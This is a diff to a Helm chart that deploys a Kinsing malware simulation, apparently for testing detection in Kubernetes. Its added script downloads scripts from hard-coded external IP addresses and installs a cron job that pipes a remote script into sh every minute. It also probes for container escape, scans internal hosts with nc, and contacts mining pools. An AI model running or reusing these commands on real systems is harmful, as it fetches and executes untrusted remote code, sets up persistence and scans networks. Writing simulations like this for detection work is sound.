@@ -1,4 +1,5 @@
-{{- if .Values.kinsing.enabled -}}
+# Kinsing Simulation Deployment
+{{- if .Values.kinsing.enabled }}
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -35,31 +36,52 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
             - |
-              apk add --no-cache curl wget
+              apk add --no-cache curl wget busybox-extras
               echo "Starting Kinsing simulation..."
+              # Reference: https://www.aquasec.com/blog/threat-alert-kinsing-malware-container-vulnerability
               while true; do
-                echo "[$(date)] curl http://195.3.146.118/kinsing.sh | sh"
-                curl -s http://195.3.146.118/kinsing 2>&1 || true
-                
+                # Phase 1: Initial payload download (simulates wget -q -O - <C2>/d.sh | sh)
+                echo "[$(date)] Downloading payload from C2..."
+                wget -q -O /tmp/d.sh http://142.44.191.122/d.sh 2>&1 || true
+                wget -q -O /tmp/kinsing.sh http://185.92.74.42/kinsing.sh 2>&1 || true
+                curl -s http://217.12.221.244/lh.sh -o /tmp/lh.sh || true
+
+                # Phase 2: Binary masquerading (kinsing drops as /tmp/kinsing, miner as /tmp/kdevtmpfsi)
+                echo "[$(date)] Deploying malicious binaries..."
                 cp /bin/sleep /tmp/kinsing
                 chmod +x /tmp/kinsing
-                echo "[$(date)] Running /tmp/kinsing..."
-                /tmp/kinsing 20 &
-                
-                echo "[$(date)] Starting cryptominer /tmp/kdevtmpfsi..."
+                /tmp/kinsing 15 &
+
                 cp /bin/sleep /tmp/kdevtmpfsi
                 chmod +x /tmp/kdevtmpfsi
-                /tmp/kdevtmpfsi 15 &
-                
-                echo "[$(date)] Container escape attempt..."
+                /tmp/kdevtmpfsi 10 &
+
+                # Phase 3: Cron persistence
+                echo "[$(date)] Setting up cron persistence..."
+                echo "* * * * * wget -q -O - http://142.44.191.122/d.sh | sh" > /tmp/cron_job
+                crontab /tmp/cron_job 2>/dev/null || true
+
+                # Phase 4: Container escape & privilege escalation
+                echo "[$(date)] Probing container escape vectors..."
                 cat /proc/self/cgroup 2>/dev/null || true
                 ls -la /var/run/docker.sock 2>/dev/null || true
-                
-                echo "[$(date)] Privilege escalation attempt..."
+                mount | grep docker 2>/dev/null || true
                 find / -perm -4000 2>/dev/null | head -5
-                
+
+                # Phase 5: Lateral movement scanning
+                echo "[$(date)] Scanning internal network..."
+                for i in $(seq 1 10); do
+                  nc -zv -w 1 10.0.0.$i 22 2>&1 || true
+                  nc -zv -w 1 10.42.0.$i 8080 2>&1 || true
+                done
+
+                # Phase 6: Mining pool connection
+                echo "[$(date)] Connecting to mining pool..."
+                nc -zv -w 2 pool.minexmr.com 4444 2>&1 || true
+                nc -zv -w 2 xmr-eu1.nanopool.org 14444 2>&1 || true
+
                 wait
-                sleep 30
+                sleep 45
               done
           {{- end }}
 {{- end }}
